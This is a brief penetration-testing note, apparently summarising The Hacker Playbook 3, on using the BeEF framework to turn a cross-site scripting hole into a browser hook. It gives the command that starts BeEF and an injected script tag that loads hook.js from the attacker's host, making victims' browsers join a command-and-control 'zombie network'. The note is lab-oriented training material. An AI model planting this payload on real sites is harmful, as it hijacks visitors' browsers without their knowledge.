# BeEF Hooking

## What it is

These notes show how an XSS foothold can be turned into a browser hook using BeEF.

## When it applies

Use this in a lab where you already have an XSS injection point and want the victim browser to connect back to a BeEF instance.

## Example

Start BeEF on your attacker Kali host from a terminal:

```text
beef-xss
```

View `http://127.0.0.1:3000/hook.js`.

Full payload hook file:

```html
<script src="http://<Your IP>:3000/hook.js"></script>
```

Viewing your `hook.js` file located on `http://127.0.0.1:3000/hook.js`, you should see something that resembles a long-obfuscated JavaScript file. This is the client payload to connect your victim back to the command and control server. Once you have identified an XSS on your target application, instead of the original `alert(1)` style payload, you would modify the hook payload to exploit the vulnerability. The original note says this XSS trap causes the browser to connect back to you and become part of your zombie network.

## Notes

The original file told the reader to authenticate with the credentials configured for their lab instance rather than relying on unchanged default credentials.

## Source

Kim, Peter. *The Hacker Playbook 3: Practical Guide To Penetration Testing* (pp. 56-57). Secure Planet. Kindle Edition.
